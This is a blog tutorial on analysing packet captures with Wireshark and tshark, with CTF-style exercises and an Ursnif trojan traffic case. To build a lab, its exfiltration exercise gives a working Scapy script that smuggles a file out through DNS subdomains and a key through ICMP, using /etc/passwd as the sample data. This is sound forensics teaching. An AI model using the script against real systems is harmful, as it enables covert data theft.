---
weight: 4
title: "PCAP analysis : How to basic"
date: 2019-02-20T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: "How to basic on Wireshark usage."
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["methodology", "wireshark", "pcap", "malware", "forensic", "blue team"]
categories: ["Shorts"]

lightgallery: true
---

# Introduction

Whether in "Capture The Flag" (CTF) events or even in professional life, we work with network captures. PCAP (Packet capture), is rich in information. It's easy to get lost in the amount of information and start on wrong tracks.
Throughout this MOOC, I will introduce you the methodology to be adopted to deal with this type of situation. Firstly, I will try to describe the PCAP content, list some tools and finally practical exercises resulting from CTF tests or malicious traffic.

# What is a PCAP file?

PCAP means "Packet Capture", as its name says, this kind of file contains complete packet going through a network interface. Complete packet means that PCAP files will contain data from second to the seventh layer of the OSI model.


![](https://i.imgur.com/KRvb6OZ.png)


## What are they used for?

As we have just seen in Figure 1, a PCAP contains all information in a packet. It can, therefore, be used to identify malicious traffic (attacker, malware...), track a threat, identifies rogue DHCP servers, monitors intrusions, or simply for research purposes...

## Who is using PCAP?

A whole bunch of people: researchers, system administrators, malware hunters or analysts during for incident response.

# Tools

Every analyst needs a well-stocked toolbox and he needs to know well its tools. Here are the main tools I use when I have to analyze PCAP file:

* Wireshark-qt / tshark
* CapAnalysis
* Binwalk / Foremost
* Scripting languages (ex: Python / Bash)
* Patience and coffee

## Wireshark / tshark

Wireshark is a tshark-based analysis and capture tool, so I'm talking about both in the same category. Wireshark provides a fairly graphical overview with intuitive filters. Here is an image of Wireshark in use:


![](https://i.imgur.com/ErHl5bT.png)


tshark is a tool used to dump and analyze network information. It is possible to select a particular protocol, IP address or other useful information like Wireshark. The main advantage of tshark on Wireshark, is data extraction.
The use of this tool may seem obscure, but here is its syntax: 

> tshark -r filename.pcap -Y display_filter -Tfields -e some_specific_filter

* __filename.pcap__: PCAP file to analyze ;
* __display_filter__: This parameter will take the wireshark display filter as an argument ;
* __some_specific_filter__: This will be used to extract a specific data.


![](https://i.imgur.com/2PdDYlr.png)


This PCAP comes from a CTF challenge. Complete writeup can be found on Ressource 3.

## CapAnalysis

CapAnalysis will be used to perform a statistical analysis of PCAP file, such as counting the number of requests per IP, the list of protocols used over time and many others. It provides a good overview of PCAP file before starting the analysis.
A docker is available on Docker Hub (see Resources 4).


![](https://i.imgur.com/nhzWXQe.png)


## Binwalk / Foremost

Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images. It will detect some file pattern inside another. For example, a packet capture during PNG file transfer:


![](https://i.imgur.com/JrElXCJ.png)


Foremost is similar to Binwalk.

## Scripting languages

Python and bash are often used because they are really user friendly and there are lot of libraries.

For Python:

* PyShark
* Scapy

For Bash:

* grep
* strings
* tr
* xxd

## TSURUGI Linux

The Linux distribution TSURUGI has been developed for forensic analysts in order to make a turnkey OS with all the essential pre-configured tools. The tools mentioned above are all installed in this distribution, even more.


![](https://pbs.twimg.com/media/Ds2ae-2XgAA3rip.jpg)


|Filename|SHA1|Download link|
|--------|----|-------------|
|tsurugi_lab_2018.1.iso|b54895db6fba93239b668edb9f5ef02bef975b40|https://tsurugi-linux.org/downloads.php |

# Pimp my Wireshark

Before starting the analysis, it is important to correctly configure your tools. __Wireshark__ will probably be the most frequently used tool in analysis. An important point to add is that the configuration I will present is my own, it is up to you to make your own. I am open to your changes and would be happy to discuss about them.

## Column changes

By default, the configuration of this tool is acceptable. We will add the following columns to make our __Wireshark__ displaying more relevant results:

* Packet source port
* Packet destination port
* Hostname
* Change date format
* Display transferred data in hex

The first column, containing the packet numbers, will be deleted. Indeed, it is possible to order the packages over time, which is more relevant, in my opinion. To modify a column in Wireshark, simply go to the __Columns__ menu at the path:

> Edit -> Preferences -> Columns


![](https://i.imgur.com/sv4qYcy.gif)


In a first time, we have to delete the number column:


![](https://i.imgur.com/m7z4eTe.png)


1. Add a column
2. Select the filter __Src port (unresolved)__ and __Dst port (unresolved)__
3. You can move the column where you want. __Don't let a column behind the 'Info' one, otherwise the column won't be displayed.__

Another important point to notice, the packet timestamp. Originally, Wireshark does not display it following ISO 8601 standard. You can change it:


![](https://i.imgur.com/RwEYnmH.gif)


One of the protocols that are recurrent in a PCAP is the `HTTP` protocol. This protocol appears frequently because any user will generate this kind of traffic while browsing the Internet, applications, and software also use it for multiple reasons, etc....
In a CTF, challenges contain unnecessary requests, in order to parasitize the PCAP traffic and try to drown the challenger under the amount of information. For malware, it may be interesting to retrieve communications with its command and control server, because it can receive orders, download other malware...

To have a PCAP file containing HTTP traffic, just open Wireshark and start capturing on a network interface with an Internet access.
With the following request in a terminal, it's enough to generate HTTP traffic:

```bash
$ curl https://www.google.com/
```

Now, it could be really nice to get hostname corresponding to IP address:


![](https://i.imgur.com/q7ZAyNp.gif)


Just right clicking on the desired data and apply it as a column. This method can be applied to anything you want, knowing that adding and deleting a column is very easy, so don't hesitate to modify __Wireshark__ according to your investigation.

Another column to be added, which may be interesting in some cases, will be the data that are passing through the network. It is possible to add a new column with the filter __data.data__, via the __custom__ menu. To generate some traffic, you can use __netcat__:


![](https://i.imgur.com/f7IXtx7.gif)


## Plugins

It is possible to develop and create Lua plugins for Wireshark. The Pentest Academy team has developed some interesting plugins (see Resource 5) to see domain names, DHCP connections or GET and POST request information. The installation is quite simple, just clone the repository and place the plugins in the right folder: 


![](https://i.imgur.com/GJ2zSeu.png)


```bash
$ git clone https://github.com/pentesteracademy/patoolkit.git
$ cp -r patoolkit/plugins/* /home/maki/.local/lib/wireshark/plugins/
```

So we have access to the Pentester Academy plugins. If either of you do, I'll be curious to know! :)


![](https://i.imgur.com/EW7kz2n.gif)


# Methodology

## Introduction

A full packet network capture is a slow and heavy process, which is why it is rarely seen in an enterprise information system. To be aware of the noise generated by a networked device, try putting Wireshark in capture mode on your ethernet or wifi interface. All operating systems are sending ICMP or ARP requests to ensure that the equipment is properly connected. There are more specific things like the broadcast of a Windows system on the network.
That's why we spent a little time earlier to configure our tools correctly. It is extremely easy to get lost among all these logs and forget what you were looking for at the beginning.

In this part of the course, I will share my methodology when analyzing a PCAP file. This methodology is divided into four main areas: 

1. Overview&static analysis
2. Hypothesis
3. Checking
4. Find the treasure

The aim is starting from a "high level" analysis, to establish hypotheses,  verify them and establish others from the results obtained. And do not forget what we are looking for at the beginning: the treasure!


![](https://media.giphy.com/media/xT1XGzAnABSXy8DPCU/giphy.gif)


## Overview & static analysis

Throughout this course, I will analyze the same PCAP file as the one used in the prerequisites:

|Filename|MD5|Download link|
|--------|---|-------------|
|OtterLeak.pcap|d0ab559c54fffe713fd13e9b0f7174df|https://mega.nz/#!2DwzBaaR!VcTfsZadubKUTNn2LwPXQXoZ2sxpbxHt65B-Wj1N-so|

First of all, it is advisable to do a static analysis of the PCAP file. As presented in the previous parts, I use the CapAnalysis tool. The goal here will be to determine the interesting artifacts and build our hypotheses. It may be interesting to start with the following points:

* Protocol used
* Amount of data sent
* Source and destination IP
* Geolocation
* Filtering on time

### State of the art


![](https://i.imgur.com/6VLrd2d.png)


In the Figure above, we can see the SMB and HTTP protocols are much more used than the others. We can try to filter through these protocols to see what comes out of them:


![](https://i.imgur.com/gbf3Pes.gif)


By filtering on the protocols, we can see that the two most talkative IPs are these two internal IPs:

* Source IP: 10.0.0.6
* Destination IP: 10.0.0.33

Let's try to find something else on these IPs. By searching a little bit in the CapAnalysis menus, we can notice some interesting data:


![](https://i.imgur.com/2KuAXaj.png)


Thanks to Figure 3, we can see that IPs __10.0.0.6__ and __10.0.0.33__ are the ones that _communicate most with each other_. In addition, we were able to learn that IP 10.0.0.33 has a domain name: __Pika.local__.

We are reaching a point where we will have to start writing hypotheses and test them for the future.

## Hypothesis

With the information retrieved from the static analysis, we are able to identify the first hypotheses. Personally, I prefer to write them on a board or use paper and pencil to keep them in front of me. There is nothing worse in forensic than losing sight of what you are looking for.

In my opinion, at this stage, it's better to be fairly generalist at first and then to refine more and more. There will be what can be called "feedback loops". It just means knowing when to step back from the situation when you fall into a deadlock. The methodology can be summarized in the following diagram:


![](https://i.imgur.com/6rn6Sh6.png)


By listing the information in our possession:

* IPs
	* 10.0.0.33 -> Pika.local
	* 10.0.0.6
* Protocols
	* SMB
	* HTTP

By limiting to this information, we are already making a huge filter on the entire PCAP file. It is important to keep in mind that the treasure we are looking for, may not be in there.

But knowing that, you can imagine some things:

1. Data extraction via HTTP? SMB?
2. Communications to a command and control server?
3. Open SMB shares with open access data (anonymous user)?
4. An attack on the SMB, such as EternalBlue?
5. A vulnerable web application?

These are examples, the aim is to identify as many hypotheses as possible in order to try to be as exhaustive as possible and then not miss something. Once the static analysis and the first hypotheses are completed, it is time to open __Wireshark__ for a more in-depth analysis.

## Checking

What I called "Checking part" is the validation or not of the previous hypotheses. This verification will mostly be done via Wireshark and tshark. What you have to force yourself to do throughout the analysis is to continue to identify hypotheses and record them.

The hypotheses generated during the static analysis of the PCAP file only give a global idea, an axis of exploration to avoid getting lost in this sea of data. Network information is important, it will serve as an indicator of compromise (IOC). These indicators allow CERTs and other analysts to determine malicious behavior. Malware often uses particular patterns: an exotic user-agent, a C&C IP...

With this information, analysts can create rules for SIEM / IDS / IPS and other network analysis equipment. These rules will be used to identify malicious behavior quickly. An IOC can be:

* IP
* User-Agent
* Host
* Specific pattern

### Round 1

With the information retrieved during the static analysis, let's try to build a filter:

* IPs filtering
* Protocol filtering

It gives us:

> ((smb2 || http) || (ip.addr == 10.0.0.33)) && (ip.addr == 10.0.0.6)

Once this filter is applied, something comes up:


![](https://i.imgur.com/QNWp36i.gif)


Now we strongly assume that there is data exfiltration via SMB2. It is important to step back from the analysis, so there are other questions to ask:

* Who or what is responsible for this behavior?
* Is the exfiltered data encrypted? Encoded?

At this point, it comes back to what I said at the beginning of this MOOC: make other hypotheses and verify them, repeat the operation as long as necessary in order to find something interesting.

### Round 2

If we look closely, the exfiltered bytes are sent only from IP 10.0.0.33 on port 445 to 10.0.0.6 on port 139. It is possible to refine our Wireshark filter a little:

> (ip.src == 10.0.0.33) && (ip.dst == 10.0.0.6) && smb2 && data.data


![](https://i.imgur.com/yijCLe4.png)


The data looks to a very particular encoding system, base64:

* Alpha chars, upper and lowercase
* Digital chars
* Terminated by an equal

To be sure of that, __tshark__ will be more useful than __Wireshark__:


![](https://i.imgur.com/KCxyP74.gif)


The final command at the end of the GIF above is:

```bash
$ tshark -r OtterLeak.pcap -Y '(ip.src == 10.0.0.33) && (ip.dst == 10.0.0.6) && smb2 && data.data' -Tfields -e data.data | tr -d '\n' | xxd -r -p | rev | base64 -d
```

* __tshark__: This command will extract all data transferred from 10.0.0.33 to 10.0.0.6 through SMB2 in the PCAP ;
* __tr__: This command will remove all line return in the bash output ;
* __xxd__: This command will convert hex digit into ascii chars ;
* __rev__:  This command will reverse the string
* __base64__: This command will decode the base64 data

## Find the treasure

After a while, we will find interesting things about the malicious actions carried out. However, analysts are fighting another scourge: __time__. The feeling of missing something can be really frustrating.

In a global attack like __Wannacry__, the real threat was time. The more analysts tried to be exhaustive, the more malware grew. The goal is to find important information quickly to stop the attack, while the security patches are put in place.
This is why the first step, during static analysis, is important. This step can be decisive for the future.

During the checking phase, if there is no relevant information, do not hesitate to restart from the beginning and repeat the procedure, in order to find more hypothesis.

Concerning this first part related to methodology, it is over. The methodology is relatively simple and is done naturally. The rather complicated points are: __force yourself to find hypotheses__ before starting the analysis head down and __take a step back__ on the investigation.

Another blocking point during the analysis will be the knowledge of the tools, including `Wireshark`. The following sections will be based on the use of tools and small tips and tricks to quickly extract the useful data.


![](https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif)


---

# Practical example

## Clear TCP

This practical work will aim to familiarize students with network tools and protocols. I chose to do these exercises as a "challenge" as in CTF. The purpose of each TP is to find a character string, a "flag". The format is __flag{ImTheFlag}__.


![](https://media.giphy.com/media/l0HU1Ajixx0bg86oU/giphy.gif)


In this first TP, we will see a TCP communication without a cryptographic layer. Many protocols rely on TCP to operate. However, most of them are not encrypted by default, here is a non-exhaustive list:

* Telnet
* HTTP
* SMTP
* ...

### Statement

The exercise material can be found on the following link:

|Filename|Hash|Download link|
|--------|----|-------------|
|cleartcp.pcapng|09a6f779bfe37db11a83b60dc8484111|https://mega.nz/#!Ka4SAQYY!ky618XDVfmGMk0WNU46fprwlkgb8JJlG4BEd38QsEyA|

The goal here will be to find the content of the message sent by __netcat__. To do the manipulation again on your side, I invite you to read the following section, concerning the resolution.

### Resolution

In this first practical exercise, it's not necessary to use CapAnalysis, because the PCAP file is ridiculously small. A simple quick view with Wireshark will be enough. Normally, if you have followed the previous chapters, something must be obvious to you:


![](https://i.imgur.com/JINQ0MV.png)


It is possible to find this result without our magic column. Wireshark is able to track a TCP connection flow. This is one of the most useful features in my opinion:

> Right click on the desired packet -> Follow TCP stream


![](https://i.imgur.com/i0V3Nlz.gif)


A new window will appear with the content of the TCP stream. In our example, there is only one stream containing little information. However, it is possible to do the same on all TCP-based protocols and quickly obtain information.

### Do it yourself

Each challenge will have this section. With the following resources you're able to reproduce the challenge environment at home.

#### Prerequisites

To do this task, and probably all challenge after, you'll need:

* Docker
* Wireshark / tshark

#### Setting up the environment

Store the following code into a file called Dockerfile:

```yaml
FROM debian:latest

RUN apt update && \
    apt install -y --no-install-recommends netcat.traditional
RUN rm -rf /var/lib/apt/lists/*

COPY run.sh /run.sh
RUN chmod +x /run.sh

EXPOSE 1664

ENTRYPOINT ["/run.sh"]
```

In the __Dockerfile__ folder, store the following bash code in __run.sh__:

```bash
#!/bin/sh

echo -n "[+] Container IP: "
ip a | grep inet | awk '{print $2}' | tail -n+2

nc -lvp 1664
```

Now, just build your container, follow these command lines:

```bash
$ sudo docker build . -t cleartcp # Generate the docke container
$ sudo docker run --rm --name cleartcp -t cleartcp
[+] Container IP: 172.17.0.2/16
listening on [any] 1664 ...
```

Congratulation! You just did your first docker container!

#### Wireshark analysis

Docker provides a network interface and use your host as the gateway. So open __Wireshark__ and listen on your __docker0__ network interface to catch all packets. If you're seeing some ICMP and ARP packets, don't worry. It's just Docker if everything is well connected.
Next step will be the easiest: sending data on the right port using netcat:

```bash
$ echo "Students cyber mooc !" | nc 172.17.0.2 1664
```


![](https://i.imgur.com/hmtsiD7.gif)


## File transfer

### Statement

In this PCAP file there is also some TCP traffic. But this time it's not a text message, but a file. The purpose of this practical exercise will be to find it and open it to see what this mysterious file contains. 

|Filename|Hash|Download link|
|--------|----|-------------|
|filetransfer.pcapng|b1cfd7c12581d9b0b2c99008d3a7e746|https://mega.nz/#!iL5GES4b!NLrHvjJoYTSavweDCR1zxgsbyxsMsw-M9k-VWVLjUWM|

### Resolution

As in the previous practical exercise, there is no need to do a statistical analysis to see what contains the PCAP file. Normally now you don't have any excuses for not having the __data.data__ and __data.text__ columns.

When opening the file, you can see interesting bytes:


![](https://i.imgur.com/SWgxpi3.png)


In the red frame you can see __PNG__, this acronym is rather explicit, but we will talk a little bit about file structures.
Almost all files have signatures, which is why our operating systems can open them with the appropriate software, even if you specify a wrong extension. In addition, the __file__ command on Linux uses the signature to return its type.
In the brown frame, we can see hexadecimal, the beginning of what seems to be a PNG. The signature present at the beginning and at the end of the files, is called __magic numbers__.
If google that, you can easily find the magic numbers of a PNG:


![](https://i.imgur.com/h56S9RH.png)


Exactly these bytes are present in the brown frame. We can deduce that we are dealing with a PNG image that has been transferred. The __libpng__ site tells us a little more about the structure of a PNG. In particular, the signature at the end containing __IEND__ chunk:


![](https://i.imgur.com/9iiG1DS.png)


As we can see in the red frame, it's a PNG file:


![](https://i.imgur.com/pd90wv9.png)


Another method to find the PNG file is using __binwalk__, as I said in tooling section, binwalk is carving tool. It will detect and try to identify file structure:


![](https://i.imgur.com/4DN9qgb.png)


Now we are 100% sure that our transferred file is a full PNG image.
As said several times before, Wireshark is based on a tool called __tshark__. It has the advantage of being in CLI, so with a little practice, we can easily extract the desired data:


![](https://i.imgur.com/uEwXqiL.png)


* __Red frame__: This is the tshark command. The PCAP file is opened and is displaying the raw content of data.data column.
* __Yellow frame__: The __tr -d__ command will allow you to delete one or more characters. The output of __tshark__ with the filter __data.data__ looks like __00:11:22:22:33:44__... with line breaks between each packet. __tr__ allows me to delete these characters to have hexdecimal data on a single line.
* __Brown frame__: This hexadecimal line represents our PNG picture. Just decode it in a file to retrieve a valid PNG and complete the challenge.


![](https://i.imgur.com/MbP0OQy.gif)


### Do it yourself

#### Prerequisite

As the last "Do it yourself" (DIY) I told you to use Docker. In fact, it's not necessary:

* netcat
* Wireshark / tshark

#### Send the picture

In this "Do it yourself", I'm going to use the __loopback (lo)__ network interface. Instead of docker network interface. The main advantage of using this interface is the absence of noise during Wireshark capture session.

Open a linux terminal:

```bash
$ nc -lvp 3615 > test.out
```

As the last DIY, open Wireshark but listen on __lo__ interface instead of __docker__ one. When everything is properly set up, open a second linux terminal and send it to the desired TCP port:

```bash
$ cat flag.png | nc 127.0.0.1 3615
```


![](https://i.imgur.com/PfHFaKe.png)


As we can see, both file are similar.

## Data exfiltration

### Statement

When an attacker has been successfully compromised a target, he will tries to extract data as discreetly as possible. ICMP and DNS protocols are oftenly used for this. In the following PCAP file, an evil hacker has stole some sensitive data. 

|Filename|Hash|Download link|
|--------|----|-------------|
|exfiltration.pcapng|1e481b149ee2d65c02d1eaea19aaedfa|https://mega.nz/#!7WwWlApI!pohkUfpW_r1yvnPTUgIL2lsBx-N424YtkdZLUoON-gk|

### Resolution

When you open the PCAP file, you can see several protocols, such as ARP, ICMP, and DNS. If your columns look like mine, you should see data quickly in the ICMP, which should not contain any.
Then, the subdomains for DNS requests are a little strange, to make it easier to read, I added a column with the filter __dns.qry.name__:


![](https://i.imgur.com/WiAAKim.png)


If you have correctly understood the previous practical exercise, then extracting the data here shouldn't be too difficult. In this PCAP file, I left the "noise" (ARP, ICMP with DNS), before starting to recover anything, we have to start making some hypotheses:

* What we know
    * ICMP hex data looks to ASCII characters
    * DNS subdomains looks to base64 encoded data
* Hypotheses
    * Are ICMP decoded data printable?
    * What's the data hide in subdomains?
    * Are ICMP and DNS data related to each other?

Before taking out the heavy artillery and diving head down and extract everything, let's try to extract the first ICMP package and the first sub-domain. Just right click on the desired element and copy the value, and decode them in your terminal:

```bash
$ echo -n "546865206b657920" | xxd -r -p
The key

$ echo -n "UEsDBBQACQAIAHOFd01q" | base64 -d
PK     s�wMj

$ echo -n "UEsDBBQACQAIAHOFd01q" | base64 -d | xxd -p
504b03041400090008007385774d6a
```


![](https://i.imgur.com/zeUKVar.gif)


The data contained in the ICMP is indeed ASCII encoded in hexa. The subdomain contains the characters "PK" followed by non-printable characters... Ok, let's try to find what type of file it is. According to the following figure, I just decoded the base64 of the first subdomain and print it as hex:


![](https://i.imgur.com/deJyBbA.png)


As the previous practical exercise,I went to the wikipedia page of file signatures and found that the first 4 bytes corresponded to the magic number of a ZIP archive:


![](https://i.imgur.com/xWNINBw.png)


Now, we can answer to our previous hypotheses:

* Is ICMP data is printable?
    * Yes, it starts with "The key".
* Are encoded subdomains contains something relevant?
	* Probably, there is ZIP magic number in the first subdomain.
* Are both protocol related to each other?
	* Don't know yet.

Before starting with new hypotheses, let's extract everything:

```bash
$ tshark -r exfiltration.pcapng -Y icmp.resp_to -T fields -e data.text | xxd -r -p
The key of the encrypted archive is: CyberMoocMooc

$ tshark -r exfiltration.pcapng -Y 'ip.src == 172.17.0.1 && !icmp' -T fields -e dns.qry.name | sed 's/\.makictf\.wtf//g' | base64 -d
PK     s�wMjR��LY
                 passwd_fileUT    9.�[
[...]
```

When I'm trying to unzip the archive, it asks me for a password. Let's try with "CyberMoocMooc":


![](https://i.imgur.com/yfltI04.gif)


### Do it yourself

As for the clear TCP, I made a small docker. This time I based the container on the image of __Python2 - Alpine__, because to simulate a DNS server that accepts all requests, I will use the SpiderLab script: __Responder__.

#### Server side

```yaml
FROM python:2-alpine

RUN apk add git

RUN mkdir /responder && git clone https://github.com/SpiderLabs/Responder.git /responder

COPY run.sh /run.sh
RUN chmod +x /run.sh

ENTRYPOINT ["/run.sh"]
```

And the __run.sh__ script:

```bash
#!/bin/sh

INTERFACE=$(ip a | grep BROADCAST | awk '{print $2}' | sed 's/@.*$//')
cd /responder && ./Responder.py -I $INTERFACE -wrf
```

Time to build and start our docker:

```bash
$ sudo docker build . -t responder && sudo docker run --rm --name responder -t responder
```

You should got something like that:


![](https://i.imgur.com/jUdHqiZ.png)
_37_: Responder up


#### Client side

For the client, basically your host, you can use the following python script (exfil.py) to generate the malicious traffic:

As for the clear TCP, I made a small docker. This time I based the container on the image of Python2 - Alpine, because to simulate a DNS server that accepts all requests, I will use the SpiderLab script: Responder.

1. Server side

```yaml
FROM python:2-alpine

MAINTAINER Alan MARREC <amarrec@protonmail.com>

RUN apk add git

RUN mkdir /responder && git clone https://github.com/SpiderLabs/Responder.git /responder

COPY run.sh /run.sh
RUN chmod +x /run.sh

ENTRYPOINT ["/run.sh"]
```

And the run.sh script:

```bash
#!/bin/sh

INTERFACE=$(ip a | grep BROADCAST | awk '{print $2}' | sed 's/@.*$//')
cd /responder && ./Responder.py -I $INTERFACE -wrf
```

Time to build and start our docker:

```bash
$ sudo docker build . -t responder && sudo docker run --rm --name responder -t responder
```

2. Client side

For the client, basically your host, you can use the following python script (exfil.py) to generate the malicious traffic:

```python
#!/usr/bin/python3
#-*- coding: utf-8 -*-

from scapy.all import *
import binascii
import base64

destIP = "172.17.0.2"

'''
Exfiltration with ICMP

@param mesg: Input to send through ICMP - C{bytes}
@return: No return, sends packets.
'''
def ping_exf(mesg):
    hex_mesg = str(binascii.hexlify(bytes(mesg, 'utf8')))[2:-1] # Removing of b' at start and ' at end
    n = 16 # Size of block
    list_split = [hex_mesg[i:i+n] for i in range(0, len(hex_mesg), n)] # Split string into list
    for i in range(0,len(list_split)):
        print(list_split[i])
        send(IP(dst=destIP)/ICMP()/list_split[i])

'''
Exfiltration with DNS A requests. Send an archive / file or wathever
splitted into 20 char / packet.
Don't forget to put a responder server on the target. 
Responder will up a DNS server that accept all requests, even wrong one.

@param mesg: Input to send via DNS A requests - C{bytes}
@return: No return, sends packets.
'''
def dns_exf(mesg):
    mesg = base64.b64encode(mesg)
    n = 20
    list_split = [mesg[i:i+n] for i in range(0, len(mesg), n)]
    
    for i in range(0, len(list_split)):
        print(str(list_split[i])[2:-1])
        part = ("%s.makictf.wtf" % str(list_split[i])[2:-1])
        sr1(IP(dst=destIP)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=part)),verbose=0)

if __name__ == "__main__":
    key_archive = "The key of the encrypted archive is: CyberMoocMooc"
    
    f = open('passwd.zip','rb')
    enc_archive = f.read()
    f.close()
   
    ping_exf(key_archive)
    dns_exf(enc_archive)
```

This script will convert a file to base64, then send it to fictitious subdomains. Just before, a string in hex is sent by ICMP. As part of our TP, I propose you to make an encrypted zip archive and send it by DNS, the key would be sent by ICMP.

```bash
$ zip -e passwd.zip /etc/passwd
Enter password: [Enter your password]
```

It is now time to run Wireshark and the exfil_gen.py script. When the script is completed, then we can stop Wireshark capture and save the traffic into a PCAP file.

## Trojan horse

In this practical exercise, it will not be a CTF challenge task. It will be a real forensic case, with a real bad malware inside it. __Then be careful with this PCAP, it contains a banking trojan__.

### Statement

The PCAP file can be download here:

|Filename|Hash|Download link|
|--------|----|-------------|
|2018-11-13-traffic-analysis-exercise.pcap|221168dc0865c145fe977b2c373022f3|https://tinyurl.com/TP-malicious|

This practical exercise comes from: https://www.malware-traffic-analysis.net/2018/11/13/index.html

And here is the questions to answer:

* What was the date and time the malicious traffic started?
* What is the MAC address of the infected Windows host?
* What is the host name of the infected Windows host?
* What is the user account name used on the infected Windows host?
* What URL in the pcap returned a Windows executable file?
* What is the size of the Windows executable file from that URL?
* What is the SHA256 hash of the Windows executable file from that URL?
* What type of malware is the Windows executable returned from that URL?

### Resolution

You can find the official correction here, the password of the archive is "__infected__" : https://www.malware-traffic-analysis.net/2018/11/13/2018-11-13-traffic-analysis-exercise-answers.pdf.zip

#### What URL in the pcap returned a Windows executable file?

I didn't do as the original author. I tried to find the malware first. I just did a research with "data.data" filter:


![](https://i.imgur.com/rkmPE4c.png)


As you can see in the red frame, there is a magic number. This magic number is for a PE file, or a Windows executable (portable executable).

If your "data.text" column is blank, you should modify your Wireshark preferences for "data" protocol:


![](https://i.imgur.com/QmQxT1M.gif)


According to the signature list on Wikipedia (cf. Resource 1):


![](https://i.imgur.com/i4SFNu7.png)


Donc, nous avons bien un executable Windows. Surement notre malware. À ce stade, il est possible de répondre à la question "What URL in the pcap returned a Windows executable file":


![](https://i.imgur.com/Ug1yPC0.gif)


Then: 

> hxxp://shumbildac[.]com/WES/fatog.php?l=ngul5.xap

#### What is the size of the Windows executable file from that URL?

Now I have to extract the PE file. You can do it with wireshark, or tshark:


![](https://i.imgur.com/0uBbNN9.gif)



![](https://i.imgur.com/tfxL8Wl.gif)


Then finding the size is quite easy now:


![](https://i.imgur.com/GlFMqni.png)


#### What is the SHA256 hash of the Windows executable file from that URL?

As above, it's will be easy to find the hash:


![](https://i.imgur.com/8Xz2Vzw.png)


> 97f149f146b0ec63c32abff204ae27638f0310536172b0f718f1a91a5672fe71

#### What type of malware is the Windows executable returned from that URL?

We can check our file on VirusTotal.com. No need to upload the file, if it's a well known malware, the hash is enough:


![](https://i.imgur.com/jAdnI8N.gif)


It looks to be "Ursnif" banking malware, don't run it on you Windows host!

#### What was the date and time the malicious traffic started?

Now that we found the malware, we can assume the date and time of the malicious traffic:


![](https://i.imgur.com/bETDt1d.png)


> At 2018/11/07 around 20:47

#### What is the MAC address of the infected Windows host?

We can see the destination IP on the above screen: __10.22.15.119__. It should be our infected Windows host. So the mac address is:


![](https://i.imgur.com/AuSZ3Uy.png)


> 00:11:2f:d1:6e:52

#### What is the host name of the infected Windows host?

To find a Windows hostname, I can filter on the IP and the DHCP protocol (__bootp__ in Wireshark):


![](https://i.imgur.com/BxRbGKd.png)


Then, the hostname is:

> Danger-Win-PC

#### What is the user account name used on the infected Windows host?

Ok, it's a Windows, we can guess some Kerberos traffic:


![](https://i.imgur.com/rlg0i4c.png)


Now, you can add a new column:


![](https://i.imgur.com/RaazFrU.gif)


> carlos.danger

And now we answered to all the questions! :D

## Ressources

1. Wireshark team, We're switching to Qt, October 2013, Wireshark blog: https://blog.wireshark.org/2013/10/switching-to-qt/
2. Wireshark team, Man page tshark, Wireshark documentations: https://www.wireshark.org/docs/man-pages/tshark.html
3. Maki, OtterCTF 2018, 24 December, Maki blog: https://maki.bzh/courses/blog/writeups/otterctf2018/#otter-leak
4. diceone, diceone/capanalysis docker, 2016, Docker Hub: https://hub.docker.com/r/diceone/capanalysis/
5. CapAnalysis team, PCAP of another point of view, CapAnalysis official website: https://www.capanalysis.net/ca/
6. ReFirmLabs, Binwalk, 2018, Official GitHub: https://github.com/ReFirmLabs/binwalk
7. korczis, Foremost, 2016, Official GitHub: https://github.com/korczis/foremost
8. PyShark, PyShark, Python packet parser using wireshark's tshark, Official GitHub: https://kiminewt.github.io/pyshark/
9. Scapy team, Scapy project, Official website: https://scapy.net/
10. Linux-France team, grep man page, Linux-France: http://www.linux-france.org/article/man-fr/man1/grep-1.html
11. Die team, strings man page, die website: https://linux.die.net/man/1/strings
12. Linuxcommand team, tr man page, linuxcommand: http://linuxcommand.org/lc3_man_pages/tr1.html
13. Systutorials team, xxd man page, systutorials: https://www.systutorials.com/docs/linux/man/1-xxd/
14. Wikipedia, ISO 8601, Wikipedia: https://fr.wikipedia.org/wiki/ISO_8601
15. cURL, curl.1 the man page, haxx.se: https://curl.haxx.se/docs/manpage.html
16. Nico, Netcat parce que c'est trop fast0ch', 20 December 2009, Les tutos de Nico: http://www.lestutosdenico.com/tutos-de-nico/netcat
17. Pentester Academy, Learn pentesting online, pentesteracademy.com: https://www.pentesteracademy.com/
18. pentesteracademy, PA Toolkit (Pentester Academy Wireshark Toolkit), 2018, Official GitHub: https://github.com/pentesteracademy/patoolkit
19. Wikipedia, Indicator of compromise, Wikipedia: https://en.wikipedia.org/wiki/Indicator_of_compromise
20. Wireshark team, Display filter in Wireshark, Official Wireshark wiki: https://wiki.wireshark.org/DisplayFilters
21. Wikipedia, Base64, Wikipedia: https://en.wikipedia.org/wiki/Base64
22. Wireshark team, Man page tshark, Wireshark documentations: https://www.wireshark.org/docs/man-pages/tshark.html
23. Linuxcommand team, tr man page, linuxcommand: http://linuxcommand.org/lc3_man_pages/tr1.html
24. Systutorials team, xxd man page, systutorials: https://www.systutorials.com/docs/linux/man/1-xxd/
25. Man team, rev(1) Linux man page, man7: http://man7.org/linux/man-pages/man1/rev.1.html
26. Die team, base64(1) man page, die: https://linux.die.net/man/1/base64
27. SpiderLabs, Responder, 2017, GitHub: https://github.com/SpiderLabs/Responder
28. Python crew, python docker, DockerHub: https://hub.docker.com/_/python/
29. VirusTotal, Analyze malicious file, VirusTotal: https://www.virustotal.com/
30. admin, Ursnif reloaded: tracing the latest trojan campaigns, 19/11/18, reaqta.com: https://reaqta.com/2018/11/ursnif-reloaded-tracing-latest-campaigns/
31. Wireshark team, Dynamic Host Configuration Protocol (DHCP), Wireshark official blog: https://wiki.wireshark.org/DHCP